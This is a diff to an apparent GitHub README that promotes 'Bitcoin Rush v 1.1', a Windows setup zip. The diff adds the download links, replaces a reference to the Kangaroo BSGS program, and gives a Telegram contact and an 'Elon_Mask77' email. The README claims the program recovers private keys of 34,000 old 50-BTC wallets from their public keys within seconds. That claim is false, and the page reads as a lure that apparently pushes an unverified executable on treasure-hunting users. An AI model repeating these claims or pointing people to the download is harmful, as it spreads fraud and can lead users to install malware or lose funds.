@@ -2,7 +2,10 @@
 34 000 Satoshi Nakamoto wallets with pubkeys (50 BTC each other)
 
 https://t.me/cryptohunt222
-Elon_Mask77@proton.me
+
+
+New version of Bitcoin Rush: [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/BitcoinRush/releases/download/1.1/BitcoinRush-setup-x64.zip)
+
 
 34 000 public keys from old addresses with 50 BTC and more (doesn't exist outgoing transactions)!
 
@@ -32,9 +35,11 @@ API URL: https://blockchain.info/q/pubkeyaddr/1DSbufiriX9LsMHaGnYVAgawk7gx6AdaGD
 Discovering the private key in the examples above requires 1000 cards and multiple years of searching.
 Occasionally, after evaluating the expenses, searching for a key becomes unprofitable.
 
-Utilizing the Kangaroo BSGS program, you can rapidly locate the private key with the public key.
+Utilizing the [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/Public-keys-for-Satoshi-Nakamoto-wallets/releases/tag/1.1) program, you can rapidly locate the private key with the public key.
 This process doesn't necessitate 1000 cards, just one (or a few) cards and a brief period. The duration of the search depends on the task.
 
-Puzzle search example 64
 Without a public key, 300x3090 and search year 24/7
 With a public key of 1x3090, it takes only 2 seconds.
+
+
+Elon_Mask77@proton.me
